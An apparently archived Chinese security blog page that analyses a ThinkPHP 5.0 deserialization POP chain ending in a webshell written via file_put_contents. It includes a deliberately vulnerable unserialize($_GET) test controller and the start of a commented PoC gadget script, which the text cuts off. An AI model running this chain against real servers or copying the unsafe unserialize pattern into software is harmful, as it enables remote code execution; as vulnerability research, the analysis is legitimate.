@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+
+  <!-- Minima -->
+  <!-- Hexo theme created by @adisaktijrs -->
+
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
+
+  
+  <title>thinkphp5.0反序列化</title>
+  
+  <link rel="canonical" href="https://ja1e.github.io/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  
+  <meta name="description" content="环境搭建thinkphp安装: composer create-project topthink&amp;#x2F;think&amp;#x3D;5.0.* thinkphp5.0 --prefer-dist  在application/index/controller/Index.php添加漏洞测试代码： &amp;lt">
+  
+  
+  <meta name="author" content="Ja1e">
+  
+  
+  
+  <meta property="og:site_name" content="Ja1e" />
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="thinkphp5.0反序列化" />
+  
+  <meta property="og:description" content="环境搭建thinkphp安装: composer create-project topthink&amp;#x2F;think&amp;#x3D;5.0.* thinkphp5.0 --prefer-dist  在application/index/controller/Index.php添加漏洞测试代码： &amp;lt">
+  
+  <meta property="og:url" content="https://ja1e.github.io/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="thinkphp5.0反序列化">
+  
+  <meta name="twitter:description" content="环境搭建thinkphp安装: composer create-project topthink&amp;#x2F;think&amp;#x3D;5.0.* thinkphp5.0 --prefer-dist  在application/index/controller/Index.php添加漏洞测试代码： &amp;lt">
+  
+  
+  
+  
+  <meta name="twitter:url" content="https://ja1e.github.io/2022/09/20/thinkphp5.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
+
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Preload fonts
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+
+  <!-- CSS
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+<link rel="stylesheet" href="/css/normalize.css">
+
+  
+<link rel="stylesheet" href="/css/skeleton.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+<link rel="stylesheet" href="/css/prism-dark.css">
+
+  
+<link rel="stylesheet" href="/css/prism-line-numbers.css">
+
+  <!-- User css -->
+  
+  
+<link rel="stylesheet" href="/css/user.css">
+
+  
+
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <link rel="icon" type="image/png" href="/images/favicon.png">
+
+  <!-- Custom Theme Color Style
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <style>
+  a:not(.icon) {
+    text-decoration-color: #0FA0CE;
+    background-image: linear-gradient(
+      to bottom,
+      rgba(0, 0, 0, 0) 50%,
+      #0FA0CE 50%
+    );
+  }
+  blockquote {
+    border-left: 8px solid #0FA0CE;
+  }
+  .nanobar .bar {
+    background: #0FA0CE;
+  }
+  .button.button-primary:hover,
+  button.button-primary:hover,
+  input[type="submit"].button-primary:hover,
+  input[type="reset"].button-primary:hover,
+  input[type="button"].button-primary:hover,
+  .button.button-primary:focus,
+  button.button-primary:focus,
+  input[type="submit"].button-primary:focus,
+  input[type="reset"].button-primary:focus,
+  input[type="button"].button-primary:focus {
+    background-color: #0FA0CE;
+    border-color: #0FA0CE;
+  }
+  input[type="email"]:focus,
+  input[type="number"]:focus,
+  input[type="search"]:focus,
+  input[type="text"]:focus,
+  input[type="tel"]:focus,
+  input[type="url"]:focus,
+  input[type="password"]:focus,
+  textarea:focus,
+  select:focus {
+    border: 1px solid #0FA0CE;
+  }
+</style>
+
+  <!-- Google Analytics (With Privacy Settings On)
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  
+
+  
+  <script src="/js/pic.min.js" defer></script>
+  
+
+  
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+  <div class="container">
+    <div class="row">
+      <div>
+
+        <div class="row">
+  <div class="two columns" style="max-width: 50px">
+    <h1 class="mt-2 mode">
+      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
+      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
+      <script >
+        if (localStorage.getItem('preferredTheme') == 'dark') {
+          setDarkMode(true)
+        }
+        function setDarkMode(isDark) {
+          var darkBtn = document.getElementById('darkBtn')
+          var lightBtn = document.getElementById('lightBtn')
+          if (isDark) {
+            lightBtn.style.display = "block"
+            darkBtn.style.display = "none"
+            localStorage.setItem('preferredTheme', 'dark');
+          } else {
+            lightBtn.style.display = "none"
+            darkBtn.style.display = "block"
+            localStorage.removeItem('preferredTheme');
+          }
+          document.body.classList.toggle("darkmode");
+        }
+      </script>
+    </h1>
+  </div>
+
+  <div class="six columns ml-1">
+    <h1 class="mt-2">
+      Hi Folks.
+    </h1>
+  </div>
+
+  <div class="twelve columns">
+    <div class="row">
+      <div class="nine columns left">
+        <a href="/">Home</a>
+        
+          
+          <a href="/About" class="ml">About</a>
+          
+        
+        
+      </div>
+    </div>
+    <hr style="margin-bottom: 2.6rem">
+  </div>
+</div>
+<link rel="stylesheet" href="/js/prism/prism.css">
+        <div class="trans">
+            <h2>thinkphp5.0反序列化</h2>
+
+  <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>thinkphp安装:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">composer create-project topthink&#x2F;think&#x3D;5.0.* thinkphp5.0 --prefer-dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在<code>application/index/controller/Index.php</code>添加漏洞测试代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Welcome to thinkphp5.0.24'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span> 
+<span class="token operator">**</span>tp5<span class="token operator">.</span><span class="token number">0</span>的访问方式<span class="token operator">**</span>：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">入口文件:	http:&#x2F;&#x2F;127.0.0.1&#x2F;code_audit&#x2F;thinkphp5.0&#x2F;public&#x2F;
+url访问:		http:&#x2F;&#x2F;127.0.0.1&#x2F;code_audit&#x2F;thinkphp5.0&#x2F;public&#x2F;?s&#x3D;&#x2F;index&#x2F;index&#x2F;test&#x2F;
+传参:		http:&#x2F;&#x2F;127.0.0.1&#x2F;code_audit&#x2F;thinkphp5.0&#x2F;public&#x2F;?s&#x3D;&#x2F;index&#x2F;index&#x2F;test&#x2F;&amp;c&#x3D;1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><h2 id="起点destruct"><a href="#起点destruct" class="headerlink" title="起点destruct"></a>起点destruct</h2><p>直接<code>Ctrl+Shift+F</code>搜索<code>__destruct(</code><br><img src="https://img-blog.csdnimg.cn/3c0fc26fc6cd4f6d8cfe489a6476d791.png" alt="在这里插入图片描述"></p>
+<p>这里跟的是Windows类。</p>
+<p>发现它调用了<code>removeFiles()</code>方法，继续跟进。</p>
+<p><img src="https://img-blog.csdnimg.cn/37c62768c98241f08da4d06a7abc4264.png" alt="tp5.01.png"></p>
+<p>发现removeFiles()函数使用了 file_exists 方法。并且file_exists 方法的参数$filename的值我们是可以通过序列化捏造的，也就是可控的。</p>
+<p>我们看看file_exists是个啥函数。<br><img src="https://img-blog.csdnimg.cn/6e6e4600a5c54d90a5a2b411893b996d.png" alt="在这里插入图片描述"><br>查看 file_exists 的定义可以知道，$filename会被当做字符串处理，那么$filename-&gt;__toString()方法就会被调用。</p>
+<h2 id="跳板tostring"><a href="#跳板tostring" class="headerlink" title="跳板tostring"></a>跳板tostring</h2><p>下面就要寻找一个实现了__toString()方法的对象来作为跳板。<br><img src="https://img-blog.csdnimg.cn/ce96344c7bdd44cfac05b474397d4555.png"><br>此处think\Model.php存在跳板可能。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用了$this-&gt;toJson()方法，我们跟进。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">toJson</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">JSON_UNESCAPED_UNICODE</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>使用了$this-&gt;toArray()方法，继续跟进。</p>
+<p><img src="https://img-blog.csdnimg.cn/d487e5c522e94ecdb626111b7593a64f.png" alt="在这里插入图片描述"><br>我们可以看到第912行，$value调用了一个getAttr()方法，如果$value可控的话，我们就可以<strong>通过控制$value的值调用__call()方法</strong>。</p>
+<p>我们往上跟进，看看$value是否可控。<br><img src="https://img-blog.csdnimg.cn/0fe5465d57fe4a5897cab3270e7743f4.png" alt="在这里插入图片描述"></p>
+<p>发现第902行$value是由getRelationData()的返回值进行赋值的，我们跟入getRelationData()函数。</p>
+<p><img src="https://img-blog.csdnimg.cn/d2a6562178e9410eb53eaf4ba23dd7d6.png" alt="在这里插入图片描述"></p>
+<p>我们发现 getRelationData() 函数中，如果我们传入的<em>参数为 Relation 类</em>（<strong>方法参数类型约束</strong>，函数参数类型写了Relation）且<em>满足 if 分支的条件</em>，那么 <u>$value就会由$this-&gt;parent 的值决定</u>，而且$this-&gt;parent 的值是可控的。</p>
+<p>1、<em>判断是否能传入一个是Relation类的对象的参数。</em></p>
+<p>我们回到\think\Model，发现调用getRelationData()函数时传入的是$modelRelation变量。也就是要让$modelRelation变量值是Ralation类的对象。<br><img src="https://img-blog.csdnimg.cn/269ba5d4800044d4b2ce91a8f6bb0a80.png" alt="在这里插入图片描述"></p>
+<p>继续跟进，$modelRelation变量是由$relation()的返回值决定的。也就是要<strong>让$relation()的返回值是Ralation类的对象</strong>。</p>
+<p>跟进$relation()，发现$relation()函数是根据$relation的值进行调用的，$relation的值是由<code>Loader::parseName($name, 1, false)</code>的返回值决定的，可以在Loader.php里找到parseName()函数。</p>
+<p><img src="https://img-blog.csdnimg.cn/9ed2116f3e054d75aec62c3e185bf63e.png" alt="在这里插入图片描述"></p>
+<p>parseName()函数只对传进来的$name参数做了一些大小写替换，没有实质上的过滤操作。<br>如果$name是可控的，那么Loader::parseName($name, 1, false)的返回值就可控，那么$relation的值就可控。</p>
+<p>往上跟踪看看$name是怎么来的，是不是可控。</p>
+<p><img src="https://img-blog.csdnimg.cn/139ef683af9c45ce881485a77904c5d4.png" alt="在这里插入图片描述"></p>
+<p>如上图，首先判断$this-&gt;append是不是空，不是的话进入下面。<code>foreach ($this-&gt;append as $key =&gt; $name)</code>把</p>
+<p>append的值赋给了$name。而$this-&gt;append是我们可控的，也就是$name可控。</p>
+<p>我们控制name的值进入最后一个if语句else。进入之后，$relation的值我们就可以控制了。</p>
+<p>接着看下面，<code>if (method_exists($this, $relation))</code> ，也就是说，$relation的值要是此类的某一个方法名。这里我们选择getError()方法。<br><img src="https://img-blog.csdnimg.cn/ec1244b3cbda498794d70b2cbbcdce51.png" alt="在这里插入图片描述"></p>
+<p>因为getError()方法会直接返回$this-&gt;error，并且$this-&gt;error可控。<br>那么$relation的值要为getError。</p>
+<p>$modelRelation变量值是$relation()的返回值，也就是getError()方法的返回值，也就是$this-&gt;error的值。</p>
+<p>要让$modelRelation变量值是Ralation类的对象，我们就要控制$this-&gt;error的值是Ralation类的对象。</p>
+<p><u>综上是可以给getRelationData() 函数传入一个Relation类的对象参数的。</u></p>
+<p>2、<em>看满不满足if分支的条件。</em><br><img src="https://img-blog.csdnimg.cn/3fbf4cc8d4974993b34893e6b1505e28.png" alt="在这里插入图片描述"></p>
+<p>$this-&gt;parent 的值可控，if分支的第一个条件可以满足。</p>
+<p>接下来我们看第二个条件，跟进 isSelfRelation() 函数。<br><img src="https://img-blog.csdnimg.cn/787d1e12a0dc4cdf9730507a9fda001a.png" alt="在这里插入图片描述"></p>
+<p>直接返回$this-&gt;selfRelation，可控，因此我们可以满足if的第二个条件。</p>
+<p>接下来我们看第三个条件，继续跟进getModel()函数。</p>
+<p><img src="https://img-blog.csdnimg.cn/592ba43e6e9948db89745100e92dcf38.png" alt="在这里插入图片描述"></p>
+<p>返回$this-&gt;query-&gt;getModel()，$query可控。因此此时我们需要查找哪个类的getModel()的返回值是可控的，在这里找到了\think\db\Query类，跟进\think\db\Query类</p>
+<p><img src="https://img-blog.csdnimg.cn/93002e6133fa42e688cd8e61853bc23c.png" alt="在这里插入图片描述"></p>
+<p>\think\db\Query类的getModel()方法返回$this-&gt;model，可控。<br>因此第三个条件满足，if分支满足。</p>
+<p><u>综上满足if分支的条件。</u></p>
+<p>那么就可以通过控制$this-&gt;parent 的值去控制$value的值。</p>
+<p>往下看，虽然$value可控，但是我们还要满足两个if的条件才能调用__call()方法，我们跟进这两个if条件。<br><img src="https://img-blog.csdnimg.cn/1fc01694bfa34d77b40362ea7e058dbf.png" alt="在这里插入图片描述"></p>
+<p>第一个if条件需要满足$modelRelation存在getBindAttr()函数，我们全局搜索一下getBindAttr()函数，发现Relation类中不存在该方法，但OneToOne类中存在，且OneToOne类是Relation类的子类。</p>
+<p>OneToOne类的getBindAttr()函数直接返回了$this-&gt;bindAttr，且$this-&gt;bindAttr可控。</p>
+<p><img src="https://img-blog.csdnimg.cn/20c332ed949c44e3a595536b24530445.png" alt="在这里插入图片描述"></p>
+<p>跟进OneToOne.php，发现OneToOne是个抽象类(abstract)，无法生成实例。</p>
+<p>我们全局搜索继承它的类，发现HasOne类(或者BelongsTo)继承了OneToOne类，因此我们可以令$modelRelation的值为HasOne，此时便可满足第一个if条件。</p>
+<p><img src="https://img-blog.csdnimg.cn/2814f2a6a0cd40ed836fc566343ec666.png"></p>
+<p>由于$this-&gt;bindAttr可控，因此我们也能满足第二个if条件。</p>
+<p>我们往下跟进，发现$attr变量由$bindAttr决定，且$attr变量用于912行的$value-&gt;getAttr()中，因此<code>$value-&gt;getAttr($attr)</code>可控，所以我们可以根据$value-&gt;getAttr($attr)调用__call()方法。</p>
+<h2 id="最后call"><a href="#最后call" class="headerlink" title="最后call"></a>最后call</h2><p>此时我们需要寻找能写webshell的__call()方法，在这里选择的是think\console\Output类<br><img src="https://img-blog.csdnimg.cn/e3a132ff7d8c4c91b9074fc4eeb51063.png" alt="在这里插入图片描述"></p>
+<p>我们看一下 in_array 方法:</p>
+<p><img src="https://img-blog.csdnimg.cn/0b01b51c7ae24faaa0b020fedcf4b9b3.png" alt="在这里插入图片描述"></p>
+<p><code>if(in_array($method,$this-&gt;styles))</code> 里的$method是getAttr，且$this-&gt;styles是可控的。只要在styles数组里加一个getAttr即可。所以可以顺利进入第一个if。</p>
+<p>array_unshift() 函数用于向数组插入新元素，新数组的值将被插入到数组的开头。<code>array_unshift($args, $method)</code>里的参数都是可控的，所以往下走没有影响。</p>
+<p>call_user_func_array()是回调函数，可以将把一个数组参数作为回调函数的参数。<code>call_user_func_array([$this, &#39;block&#39;], $args);</code> 也就是调用block函数，传参是$args数组。</p>
+<p>我们跟一下block函数。<br><img src="https://img-blog.csdnimg.cn/32c1de3adf654b2f8d5618a2ade3f911.png" alt="在这里插入图片描述"></p>
+<p>跟进writeln函数。<br><img src="https://img-blog.csdnimg.cn/be4d79be92a94313a1accfb7395a27f2.png" alt="在这里插入图片描述"></p>
+<p>跟进write函数。</p>
+<p><img src="https://img-blog.csdnimg.cn/2acae2f7e46d45f8a5458d8672433c50.png" alt="在这里插入图片描述"></p>
+<p>在这里$this-&gt;handle是可控的，我们寻找能写webshell的write()方法，此次选择了 think\session\driver\Memcache 类的write()方法。<br><img src="https://img-blog.csdnimg.cn/1442d051b4cb417c94558088489ea941.png" alt="在这里插入图片描述"></p>
+<p>在这里$this-&gt;handler又是可控的，使用了$this-&gt;handler-&gt;set方法。</p>
+<p>我们继续寻找能写webshell的set()方法，此次选择了think\cache\driver\File 类。</p>
+<p><img src="https://img-blog.csdnimg.cn/bc78cbc235904f21aed20ed0b4bb67fd.png" alt="在这里插入图片描述"></p>
+<p>我们可以看到think\cache\driver\File 类的set()方法通过file_put_contents()将$data写进了$filename文件，我们跟进$data和$filename，看$data与$filename是否可控。</p>
+<p>往上跟进发现$filename的值是由getCacheKey()方法决定的，我们跟进getCacheKey()函数。<br><img src="https://img-blog.csdnimg.cn/99ed006063714fbe9e1dd1f00cb76f98.png" alt="在这里插入图片描述"></p>
+<p>从getCacheKey()函数80行处的语句我们可以知道$filename的后缀是写死的，为php，并且文件名的一部分<code>options[&#39;path&#39;]</code>可控。</p>
+<p>这时如果$data可控的话就可以getshell了。<br>我们跟进$data，发现$data最终是由think\console\Output类的write()方法决定的，$data的值为true，已经被写死了。</p>
+<p>这样就说明了file_put_contents()函数能写入php文件，但内容不可控，无法写shell。</p>
+<p>继续往下看，发现有个setTagItem()函数，跟进该函数看看。<br><img src="https://img-blog.csdnimg.cn/4c14ea7c5f6d4f82be9caedd41e4cd8c.png" alt="在这里插入图片描述"></p>
+<p>我们可以看到在setTagItem()函数中又一次调用了set()函数，并且这次的$key是可控的，$value由之前的$filename决定，这也意味着我们可以通过setTagItem()再一次的写入php文件进行getshell。</p>
+<p>到这里整个pop链已经梳理完了，接下来我们看看如何利用这条pop链进行getshell。</p>
+<h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><p>利用的时候我们首先需要绕过exit()的限制，因为利用file_put_contents()写入文件时内容有exit()函数并且在比较靠前的位置，如果执行到了exit()函数就会自动退出，不会执行我们写入的shell，所以我们需要绕过这个函数，这里用到php的伪协议编码进行绕过。</p>
+<blockquote>
+<p>也就是说我们只需要在文件名中使用伪协议即可对exit()函数进行绕过</p>
+</blockquote>
+<p>到这里我们其实可以写出整个payload了，但是目前只能写出Linux下的payload。</p>
+<p>先梳理一下链子：</p>
+<pre class="line-numbers language-none"><code class="language-none">Windows类的__destruct()--&gt;removeFiles()--&gt;Model类的__tostring()--&gt;toJson()--&gt;toArray()--&gt;Output类的__call()--&gt;block()--&gt;writeln()--&gt;write()--&gt;Memcache类的write()--&gt;File类的set()--&gt;Driver类的setTagItem()--&gt;File类的set()--&gt;file_put_contents写入shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="linux下的poc-注释版"><a href="#linux下的poc-注释版" class="headerlink" title="linux下的poc(注释版"></a>linux下的poc(注释版</h2><p>linux下的tp5.0反序列化的poc编写（有详细注释版）：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/*
+反序列化的起点是Windows类里的__destruct方法，所以把Windows类抄过来。
+已知Windows类这段的链子是：
+	__destruct()-->removeFiles()-->file_exists()-->Model类的__tostring()
+其中file_exists的参数由Windows类的files属性决定，我们需要控制files是某个类的对象，所以把files属性抄过来。
+files的值应选择有tostring方法且能利用的类。
+*/</span>
+<span class="token comment">/* 
+关于这里namespace和use的使用：
+1.namespace就直接抄原来的就行。
+2.use后面的值就要填本类里new过的类的namespace。
+	比如Windows类里new了Pivot类，那就要在Windows类的前面写上use &lt;Pivot类所在的namespace>\Pivot，也就是use think\model\Pivot。
+*/</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//---------------------------------------------------------------------------</span>
+
+<span class="token comment">/*
+本来是触发Model类的tostring方法，但是Model是抽象类(abstract)，不能实例化(new)。
+而Pivot类继承了Model类，拥有Model类的属性和方法，所以用Pivot类可以达到一样的效果，把Pivot类抄过来。
+这段的链子是：
+	__tostring()-->toJson()-->toArray()
+主要是toArray()方法的利用。根据之前的分析，我们想要利用$value->getAttr($attr)触发call方法，就要控制value的值。
+1.控制$append-->控制$name-->控制$relation,而$relation要='getError'，所以$append=array('getError');!!!
+2.$modelRelation等于$relation()的返回值也就是getError()的返回值，也就是$error的值。
+	$modelRelation还得是Relation的对象。所以$error就要是Relation的对象。但是Relation是抽象类，不能实例化。
+	我们找找继承了Relation类的类，OneToOne类继承了Relation类，BelongsTo类继承了OneToOne类。
+	所以可以$error=new BelongsTo();!!!
+3.getRelationData的三个if：
+	-Model类的parent不为空。
+	-Relation类的selfRelation要为假,selfRelation=false;!!!。
+	-Relation类的query调用的getModel()函数返回值要等于Model类的parent。
+		Model类的parent可控，Relation类的query可控，我们找存在可控的getModel()函数的类即可。
+		这里用Query类，可控变量为model。
+
+这里选择触发Output类的call方法，所以
+Pivot类的parent和Query类的model都等于new Output();!!!
+
+4.两个if
+	-BelongsTo类要有getBindAttr()函数，因为OneToOne类有getBindAttr()函数，而BelongsTo类继承了OneToOne类，所以刚好满足。
+	-$bindAttr不为空-->BelongsTo类的getBindAttr()的返回值不为空-->BelongsTo类的bindAttr属性不为空。
+		所以随便赋个值bindAttr=array('hacker')
+
+*/</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">//---------------------------------------------------------------------------</span>
+<span class="token comment">/*
+$value为Output的对象，$value->getAttr($attr)触发Output类的call方法。
+这段链子：
+	__call()-->block()-->writeln()-->write()
+1.$method已知是getAttr，所以要进入第一个if，我们控制$styles = ['getAttr'];!!!
+2.跟跟跟跟到了write(),handle可控，我们调用Memcache类的write
+	所以控制handle=new Memcache();!!!
+*/</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
